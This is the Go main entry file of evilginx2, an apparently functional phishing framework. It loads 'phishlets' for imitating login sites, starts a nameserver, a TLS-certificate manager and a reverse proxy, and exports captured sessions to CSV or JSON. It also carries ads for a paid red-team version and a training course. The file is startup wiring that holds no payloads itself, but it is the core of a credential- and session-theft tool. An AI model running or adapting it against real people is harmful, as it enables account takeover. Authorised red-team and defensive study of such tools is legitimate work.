package main

import (
	"flag"
	"fmt"
	_log "log"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"time"

	"github.com/caddyserver/certmagic"
	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"go.uber.org/zap"

	"github.com/fatih/color"
)

var phishlets_dir = flag.String("p", "", "Phishlets directory path")
var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
var debug_log = flag.Bool("debug", false, "Enable debug output")
var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
var cfg_dir = flag.String("c", "", "Configuration directory path")
var version_flag = flag.Bool("v", false, "Show version")
var export_csv = flag.Bool("export-csv", false, "Export all captured sessions to CSV file (with timestamp) and exit")
var export_json = flag.Bool("export-json", false, "Export all captured sessions to JSON file (with timestamp) and exit")
var cert_renewal_check = flag.Int("cert-renewal-check", 24, "Certificate renewal check interval in hours (default: 24)")

func joinPath(base_path string, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}

func showEvilginxProAd() {
	lred := color.New(color.FgHiRed)
	lyellow := color.New(color.FgHiYellow)
	white := color.New(color.FgHiWhite)
	message := fmt.Sprintf("%s %s: %s %s", lred.Sprint("Evilginx Pro"), white.Sprint("is finally out"), lyellow.Sprint("https://evilginx.com"), white.Sprint("(advanced phishing framework for red teams)"))
	log.Info("%s", message)
}

func showEvilginxMasteryAd() {
	lyellow := color.New(color.FgHiYellow)
	white := color.New(color.FgHiWhite)
	hcyan := color.New(color.FgHiCyan)
	message := fmt.Sprintf("%s: %s %s", hcyan.Sprint("Evilginx Mastery Course"), lyellow.Sprint("https://academy.breakdev.org/evilginx-mastery"), white.Sprint("(learn how to create phishlets)"))
	log.Info("%s", message)
}

func main() {
	flag.Parse()

	if *version_flag == true {
		log.Info("version: %s", core.VERSION)
		return
	}

	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()
	showEvilginxProAd()
	showEvilginxMasteryAd()

	_log.SetOutput(log.NullLogger().Writer())
	certmagic.Default.Logger = zap.NewNop()
	certmagic.DefaultACME.Logger = zap.NewNop()

	if *phishlets_dir == "" {
		*phishlets_dir = joinPath(exe_dir, "./phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			*phishlets_dir = "/usr/share/evilginx/phishlets/"
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
				return
			}
		}
	}
	if *redirectors_dir == "" {
		*redirectors_dir = joinPath(exe_dir, "./redirectors")
		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
			*redirectors_dir = "/usr/share/evilginx/redirectors/"
			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
				*redirectors_dir = joinPath(exe_dir, "./redirectors")
			}
		}
	}
	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
	}

	log.DebugEnable(*debug_log)
	if *debug_log {
		log.Info("debug output enabled")
	}

	phishlets_path := *phishlets_dir
	log.Info("loading phishlets from: %s", phishlets_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetRedirectorsDir(*redirectors_dir)

	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
	if err != nil {
		log.Fatal("database: %v", err)
		return
	}

	if *export_csv {
		filename, err := db.ExportSessionsCSV("")
		if err != nil {
			log.Fatal("export CSV failed: %v", err)
			return
		}
		log.Success("sessions exported to CSV: %s", filename)
		return
	}
	if *export_json {
		filename, err := db.ExportSessionsJSON("")
		if err != nil {
			log.Fatal("export JSON failed: %v", err)
			return
		}
		log.Success("sessions exported to JSON: %s", filename)
		return
	}

	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}

	files, err := os.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if rpname == nil || len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
				if err != nil {
					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
					continue
				}
				cfg.AddPhishlet(pname, pl)
			}
		}
	}
	cfg.LoadSubPhishlets()
	cfg.CleanUp()

	ns, _ := core.NewNameserver(cfg)
	ns.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}

	crc := cfg.GetCertRenewalConfig()
	crc.CheckInterval = *cert_renewal_check
	cfg.SetCertRenewalConfig(crc)
	if crc.Enabled && !*developer_mode {
		go func() {
			time.Sleep(30 * time.Second)
			for {
				if err := crt_db.CheckAndRenewCertificates(); err != nil {
					log.Error("certificate renewal error: %v", err)
				}
				intervalH := cfg.GetCertRenewalConfig().CheckInterval
				if intervalH <= 0 {
					intervalH = 24
				}
				time.Sleep(time.Duration(intervalH) * time.Hour)
			}
		}()
		log.Info("automatic certificate renewal enabled (check every %d hours)", *cert_renewal_check)
	}

	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
	hp.Start()

	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	t.DoWork()
}
